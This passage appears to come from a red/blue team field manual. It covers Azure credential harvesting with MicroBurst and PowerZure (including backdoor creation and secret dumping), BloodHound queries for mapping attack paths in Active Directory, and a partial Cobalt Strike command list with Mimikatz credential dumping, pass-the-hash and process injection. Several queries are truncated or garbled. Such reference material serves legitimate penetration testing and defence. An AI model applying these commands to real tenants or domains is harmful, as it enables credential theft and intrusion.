SCENARIO: You’ve been able to obtain credentials for a privileged 
user for Azure AD (Owner or Contributor). You can now target this 
user by possibly harvesting credentials stored in either Key 
Vaults, App Services Configurations, Automation Accounts, and 
Storage Accounts. 
STEP 1: Install PowerShell modules and download/Import Microburst 
by NetSPI: 
Install-Module -Name AzureRM 
Install-Module -Name Azure 
https://github.com/NetSPI/MicroBurst 
Import-Module .\Get-AzurePasswords.ps1 
STEP 2: Now that the PowerShell module is imported we can execute 
it to retrieve all available credentials at once from Key Vaults, 
App Services Configurations, Automation Accounts, and Storage 
Accounts. You will be prompted for the user account, credentials, 
and subscription you’d like to use. We can pipe the output to a CSV 
file: 
Get-AzurePasswords -Verbose | Export-CSV 
POWERZURE 
PowerZure is a PowerShell script written to assist in assessing 
Azure security. Functions are broken out into their context as well 
as the role needed to run them. 
FUNCTION 
DESCRIPTION 
ROLE 
HELP 
PowerZure -h 
Displays the help menu 
Any 
MANDATORY 
Set-Subscription 
Sets the default 
Subscription to operate 
in 
Reader 
OPERATIONAL 
Create-Backdoor 
Creates a Runbook that 
creates an Azure account 
Admin 
46 
and generates a Webhook 
to that Runbook 
Execute-Backdoor 
Executes the backdoor 
that is created with 
"Create-Backdoor". Needs 
the URI generated from 
Create-Backdoor 
Admin 
Execute-Command 
Executes a command on a 
specified VM 
Contributor 
Execute-MSBuild 
Executes MSBuild payload 
on a specified VM. By 
default, Azure VMs 
have .NET 4.0 installed. 
Will run as SYSTEM. 
Contributor 
Execute-Program 
Executes a supplied 
program. 
Contributor 
Upload-StorageContent 
Uploads a supplied file 
to a storage share. 
Contributor 
Stop-VM 
Stops a VM 
Contributor 
Start-VM 
Starts a VM 
Contributor 
Restart-VM 
Restarts a VM 
Contributor 
Start-Runbook 
Starts a specific Runbook 
Contributor 
Set-Role 
Sets a role for a 
specific user on a 
specific resource or 
subscription 
Owner 
Remove-Role 
Removes a user from a 
role on a specific 
resource or subscription 
Owner 
Set-Group 
Adds a user to a group 
Admin 
INFO GATHER 
Get-CurrentUser 
Returns the current 
logged in user name, 
their role + groups, and 
any owned objects 
Reader 
Get-AllUsers 
Lists all users in the 
subscription 
Reader 
Get-User 
Gathers info on a 
specific user 
Reader 
Get-AllGroups 
Lists all groups + info 
within Azure AD 
Reader 
Get-Resources 
Lists all resources in 
the subscription 
Reader 
Get-Apps 
Lists all applications in 
the subscription 
Reader 
Get-GroupMembers 
Gets all the members of a 
specific group. Group 
does NOT mean role. 
Reader 
47 
Get-AllGroupMembers 
Gathers all the group 
members of all the 
groups. 
Reader 
Get-AllRoleMembers 
Gets all the members of 
all roles. Roles does not 
mean groups. 
Reader 
Get-Roles 
Lists the roles in the 
subscription 
Reader 
Get-RoleMembers 
Gets the members of a 
role 
Reader 
Get-Sps 
Returns all service 
principals 
Reader 
Get-Sp 
Returns all info on a 
specified service 
principal 
Reader 
Get-Apps 
Gets all applications and 
their Ids 
Reader 
Get-AppPermissions 
Returns the permissions 
of an app 
Reader 
Get-WebApps 
Gets running web apps 
Reader 
Get-WebAppDetails 
Gets running webapps 
details 
Reader 
SECRET GATHER 
Get-KeyVaults 
Lists the Key Vaults 
Reader 
Get-KeyVaultContents 
Get the secrets from a 
specific Key Vault 
Contributor 
Get-AllKeyVaultContents 
Gets ALL the secrets from 
all Key Vaults. 
Contributor 
Get-AppSecrets 
Returns the application 
passwords or certificate 
credentials 
Contributor 
Get-AllAppSecrets 
Returns all application 
passwords or certificate 
credentials (If 
accessible) 
Contributor 
Get-AllSecrets 
Gets ALL the secrets from 
all Key Vaults and 
applications. 
Contributor 
Get-
AutomationCredentials 
Gets the credentials from 
any Automation Accounts 
Contributor 
DATA EXFIL 
Get-StorageAccounts 
Gets all storage accounts 
Reader 
Get-StorageAccountKeys 
Gets the account keys for 
a storage account 
Contributor 
Get-StorageContents 
Gets the contents of a 
storage container or file 
share 
Reader 
Get-Runbooks 
Lists all the Runbooks 
Reader 
48 
Get-RunbookContent 
Reads content of a 
specific Runbook 
Reader 
Get-AvailableVMDisks 
Lists the VM disks 
available. 
Reader 
Get-VMDisk 
Generates a link to 
download a Virtual 
Machine's disk. The link 
is only available for an 
hour. 
Contributor 
Get-VMs 
Lists available VMs 
Reader 
REFERENCE: 
https://github.com/hausec/PowerZure 
https://blog.netspi.com/attacking-azure-with-custom-script-extensions/ 
https://github.com/puresec/awesome-serverless-security/#azure-functions-
security 
https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-
powerzure-ca70b330511a 
https://github.com/mattrotlevi/lava 
https://blog.netspi.com/get-azurepasswords/ 
https://www.lares.com/hunting-azure-admins-for-vertical-escalation 
A
A 
AZURE_Hardening 
BLUE TEAM 
CONFIGURATION 
CLOUD 
Best Practice Rules for Azure 
https://www.cloudconformity.com/knowledge-base/azure/ 
A
A 
AZURE_Terms 
RED/BLUE TEAM 
RECON/ADMIN 
CLOUD 
Azure Terms Cheat Sheets 
https://docs.microsoft.com/en-us/azure/azure-glossary-cloud-
terminology 
https://www.whizlabs.com/blog/microsoft-azure-cheat-sheet/ 
A
A 
AZURE_Tricks 
RED/BLUE TEAM 
RECON/ADMIN 
CLOUD 
49 
Azure Tips & Tricks Blog 
https://microsoft.github.io/AzureTipsAndTricks/ 
https://github.com/deltadan/az-cli-kung-fu 
B 
B
B 
BLOODHOUND 
RED/BLUE TEAM 
RECON 
WINDOWS 
BloodHound uses graph theory to reveal the hidden and often 
unintended relationships within an Active Directory environment. 
Attackers can use BloodHound to easily identify highly complex 
attack paths that would otherwise be impossible to quickly 
identify. Defenders can use BloodHound to identify and eliminate 
those same attack paths.  
BLOODHOUND CYPHER QUERIES 
List all owned users 
MATCH (m:User) WHERE m.owned=TRUE RETURN m 
List all owned computers 
MATCH (m:Computer) WHERE m.owned=TRUE RETURN m 
List all owned groups 
MATCH (m:Group) WHERE m.owned=TRUE RETURN m 
List all High Valued Targets 
MATCH (m) WHERE m.highvalue=TRUE RETURN m 
List the groups of all owned users 
50 
MATCH (m:User) WHERE m.owned=TRUE WITH m MATCH p=(m)-
[:MemberOf*1..]->(n:Group) RETURN p 
Find all Kerberoastable Users 
MATCH (n:User)WHERE n.hasspn=true RETURN n 
Find All Users with an SPN/Find all Kerberoastable Users with 
passwords last set less than 5 years ago 
MATCH (u:User) WHERE u.hasspn=true AND u.pwdlastset (g) ) RETURN p 
Find machines Domain Users can RDP into 
match p=(g:Group)-[:CanRDP]->(c:Computer) where g.objectid ENDS 
WITH '-513' return p 
Find what groups can RDP 
MATCH p=(m:Group)-[r:CanRDP]->(n:Computer) RETURN p 
Find groups that can reset passwords (Warning: Heavy) 
MATCH p=(m:Group)-[r:ForceChangePassword]->(n:User) RETURN p 
Find groups that have local admin rights (Warning: Heavy) 
MATCH p=(m:Group)-[r:AdminTo]->(n:Computer) RETURN p 
Find all users that have local admin rights 
MATCH p=(m:User)-[r:AdminTo]->(n:Computer) RETURN p 
Find all active Domain Admin sessions 
MATCH (n:User)-[:MemberOf]->(g:Group) WHERE g.objectid ENDS WITH '-
512' MATCH p = (c:Computer)-[:HasSession]->(n) return p 
Find all computers with Unconstrained Delegation 
MATCH (c:Computer {unconstraineddelegation:true}) return c 
Find all computers with unsupported operating systems 
MATCH (H:Computer) WHERE H.operatingsystem =~ 
'.*(2000|2003|2008|xp|vista|7|me)*.' RETURN H 
Find users that logged in within the last 90 days 
MATCH (u:User) WHERE u.lastlogon (c:Computer) RETURN p 
Find computers that allow unconstrained delegation that AREN’T 
domain controllers. 
MATCH (c1:Computer)-[:MemberOf*1..]->(g:Group) WHERE g.objectid 
ENDS WITH '-516' WITH COLLECT(c1.name) AS domainControllers MATCH 
(c2:Computer {unconstraineddelegation:true}) WHERE NOT c2.name IN 
domainControllers RETURN c2 
51 
Return the name of every computer in the database where at least 
one SPN for the computer contains the string 'MSSQL' 
MATCH (c:Computer) WHERE ANY (x IN c.serviceprincipalnames WHERE 
toUpper(x) CONTAINS 'MSSQL') RETURN c 
View all GPOs 
Match (n:GPO) RETURN n 
View all groups that contain the word 'admin' 
Match (n:Group) WHERE n.name CONTAINS 'ADMIN' RETURN n 
Find users that can be AS-REP roasted 
MATCH (u:User {dontreqpreauth: true}) RETURN u 
Find All Users with an SPN/Find all Kerberoastable Users with 
passwords last set > 5 years ago 
MATCH (u:User) WHERE n.hasspn=true AND WHERE u.pwdlastset (m:Group {highvalue:true}) 
RETURN p 
Find groups that contain both users and computers 
MATCH (c:Computer)-[r:MemberOf*1..]->(groupsWithComps:Group) WITH 
groupsWithComps MATCH (u:User)-[r:MemberOf*1..]->(groupsWithComps) 
RETURN DISTINCT(groupsWithComps) as groupsWithCompsAndUsers 
Find Kerberoastable users who are members of high value groups 
MATCH (u:User)-[r:MemberOf*1..]->(g:Group) WHERE g.highvalue=true 
AND u.hasspn=true RETURN u 
Find Kerberoastable users and where they are AdminTo 
OPTIONAL MATCH (u1:User) WHERE u1.hasspn=true OPTIONAL MATCH (u1)-
[r:AdminTo]->(c:Computer) RETURN u 
Find computers with constrained delegation permissions and the 
corresponding targets where they allowed to delegate 
MATCH (c:Computer) WHERE c.allowedtodelegate IS NOT NULL RETURN c 
Find if any domain user has interesting permissions against a GPO 
(Warning: Heavy) 
MATCH p=(u:User)-
[r:AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl|WriteOw
ner|GpLink*1..]->(g:GPO) RETURN p 
Find if unprivileged users have rights to add members into groups 
MATCH (n:User {admincount:False}) MATCH p=allShortestPaths((n)-
[r:AddMember*1..]->(m:Group)) RETURN p 
Find all users a part of the VPN group 
Match p=(u:User)-[:MemberOf]->(g:Group) WHERE toUPPER (g.name) 
CONTAINS 'VPN' return p 
Find users that have never logged on and account is still active 
MATCH (n:User) WHERE n.lastlogontimestamp=-1.0 AND n.enabled=TRUE 
RETURN n  
52 
Find an object in one domain that can do something to a foreign 
object 
MATCH p=(n)-[r]->(m) WHERE NOT n.domain = m.domain RETURN p 
Find all sessions a user in a specific domain has 
MATCH p=(m:Computer)-[r:HasSession]->(n:User {domain:{result}}) 
RETURN p 
REFERENCE: 
https://github.com/BloodHoundAD/BloodHound 
https://github.com/BloodHoundAD/Bloodhound/wiki 
https://posts.specterops.io/introducing-bloodhound-3-0-c00e77ff0aa6 
https://github.com/chryzsh/awesome-bloodhound 
https://github.com/SadProcessor/HandsOnBloodHound 
https://github.com/hausec/Bloodhound-Custom-Queries 
C 
C
C 
COBALT STRIKE 
RED TEAM 
C2 
WINDOWS 
Cobalt Strike is software for Adversary Simulations and Red Team 
Operations. 
COMMAND 
DESCRIPTION 
BASIC 
cancel [*file*]  
Cancel a download currently 
in progress, wildcards 
accepted.  
cd [directory]  
Change into the specified 
working directory.  
clear  
Clear all current taskings.  
53 
cp [src] [dest]  
File copy  
download [C:\filePath]  
Download a file from the path 
on the Beacon host.  
downloads  
Lists downloads in progress  
execute-assembly 
un a local .NET executable as 
a Beacon post-exploitation 
job as your current token 
exit  
Task the Beacon to exit.  
help  
Display all available 
commands or the help for a 
specified command  
inject [pid]   
Inject a new Beacon into the 
specified process  
jobkill [job ID]  
Kill the specified job ID.  
jobs  
List the running jobs.  
keylogger [pid]   
injects a keystroke logger 
into the given process ID and 
architecture  
link/unlink [IP address]  
Link/unlink to/from a remote 
Beacon.  
ls   
List the files on the 
specified path or the current 
folder.  
net 
[session/share/localgroup/etc] 
Beacon net commands 
implemented that don’t rely 
on net.exe 
ps 
Show a process listing  
pwd  
Display the current working 
directory for the Beacon 
session.  
reg_query [x86|x64] 
[HIVE\path\to\key] 
query a specific key in the 
registry 
reg_query [x86|x64] 
[HIVE\path\to\key] [value] 
uery a specific value within 
a registry key 
rm [file\folder]  
Delete a file\folder.  
screenshot [pid]  
[runtime in seconds]  
injects a screen capture stub 
into the specified 
process/architecture for the 
specified number of seconds.  
setenv 
set an environment variable 
shell [cmd] [arguments]  
Execute a shell command using 
cmd.exe  
sleep [seconds]   
Set the Beacon to sleep for 
the number of seconds and the 
associated 0-99% jitter. 0 
means interactive.  
upload [/path/to/file]  
Upload a file from the 
attacker machine to the 
54 
current Beacon working 
directory  
SPOOFING 
argue [command] [fake arguments] 
add a command to the fake 
arugments internal list 
ppid   
set the parent process ID  
spawnto  
set the child process spawned  
MIMIKATZ 
mimikatz [module::command]   
format to execute a 
Mimikatz !module:: elevate to 
SYSTEM; @module:: force usage 
of current token. 
logonpasswords  
will execute the 
sekurlsa::logonpasswords 
module which extracts hashes 
and plaintext passwords out 
of LSASS  
dcsync [DOMAIN.fqdn] 
[DOMAIN\user]  
will use lsadump::dcync to 
extract the hash for the 
specified user from a domain 
controller  
pth [DOMAIN\user] [NTLM hash]  
will use sekurlsa::pth to 
inject a user’s hash into 
LSASS;requires local admin 
privileges.  
DESKTOP VNC 
desktop   
stage a VNC server into the 
memory of the current process 
and tunnel the connection 
through Beacon 
POWERSHELL 
powershell-import 
[/path/to/script.ps1]  
import a PowerShell .ps1 
script from the control 
server and save it in memory 
in Beacon  
powershell [commandlet] 
[arguments]  
setup a local TCP server 
bound to localhost and 
download the script; function 
and any arguments are 
executed and output is 
returned.  
powerpick [commandlet] 
[arguments]  
launch the given function 
using @tifkin_’s Unmanaged 
PowerShell, which doesn’t 
start powershell.exe  
psinject [pid] [arch] 
[commandlet] [arguments]  
inject Unmanaged PowerShell 
into a specific process and 
execute the specified command  
55 
SESSION PASSING 
dllinject [pid] 
inject a Reflective DLL into 
a process. 
inject [pid]   
Inject a new Beacon into the 
specified process  
shinject [pid]   
[/path/to/file.bin] 
inject shellcode, from a 
local file,into a process on 
target 
spawn [x86|x64] [listener]  
Spawn a new Beacon process to 
the given listener.  
spawnas [DOMAIN\user] [password] 
[listener]  
Spawn a new Beacon to the 
specified listener as another 
user.  
dllload [pid] 
[c:\path\to\file.dll] 
load an on-disk DLL in 
another process. 
PRVILEGE ESCALATION 
elevate 
list privilege escalation 
exploits registered with 
Cobalt Strike. 
elevate [exploit] [listener] 
attempt to elevate with a 
specific exploit. 
runasadmin 
ist command elevator exploits 
registered with Cobalt 
Strike.  
runasadmin [exploit] [command + 
args] 
attempt to run the specified 
command in an elevated 
context 
runas[DOMAIN\user] [password] 
[command] 
run a command as another user 
using their credentials. 
spawnas [DOMAIN\user] [password] 
[listener] 
spawn a session as another 
user using their credentials. 
getsystem 
impersonate a token for the 
SYSTEM account. 
elevate svc-exe [listener] 
Get SYSTEM is to create a 
service that runs a payload. 
getprivs 